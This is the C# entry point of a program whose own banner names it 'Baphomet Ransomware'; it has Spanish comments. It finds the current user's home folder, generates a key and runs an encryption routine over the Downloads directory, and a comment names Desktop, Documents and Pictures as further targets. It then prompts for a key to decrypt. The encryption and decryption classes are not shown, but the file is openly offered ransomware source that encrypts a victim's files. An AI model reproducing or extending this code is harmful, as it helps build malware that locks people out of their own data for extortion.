using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Baphomet
{
    public class Program 
    {
        static void Main()
        {
            Cryptep cryptep = new Cryptep();
            Decrypt decrypt = new Decrypt();

            var key = cryptep.GenerateKey();

            var userName = Environment.UserName;
            var computerName = System.Environment.MachineName.ToString();
            //Directorios donde los usuarios suelen guardar sus archivos ("Desktop","Documents","Pictures" etc)
            var Dirs = new[] { "\\Downloads" };
            var  userDir = "C:\\Users\\" +userName;

            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
            {
                var targetPath = userDir + Dirs[d];
                cryptep.directoryRoad(targetPath, key);
            }
            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("Baphomet Ransomware"));
            Console.WriteLine("Enter your key here:");
            string password = Console.ReadLine();

            for (int d = 0; d < Dirs.Length; d++)//recorro cada uno de los dirs validos
            {
                var decryp_targetPath = userDir + Dirs[d];
                decrypt.directoryRoad(decryp_targetPath, password);
            }


        }


       

    }
}
